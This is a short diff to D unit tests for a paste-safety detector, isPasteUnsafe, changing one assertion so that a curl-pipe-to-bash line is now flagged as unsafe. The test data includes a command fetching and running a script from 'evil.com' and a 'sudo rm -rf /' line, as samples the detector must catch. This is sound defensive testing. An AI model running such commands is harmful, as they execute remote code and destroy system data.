@@ -224,8 +224,8 @@ unittest {
 
 /// Test: isPasteUnsafe with real-world dangerous paste patterns.
 unittest {
-    // curl pipe to shell — not caught by current implementation (no sudo)
-    assert(!isPasteUnsafe("curl https://evil.com/install.sh | bash\n"));
+    // curl pipe to shell — now detected
+    assert(isPasteUnsafe("curl https://evil.com/install.sh | bash\n"));
 
     // Multi-line with sudo in second line
     assert(isPasteUnsafe("echo hello\nsudo rm -rf /\n"));
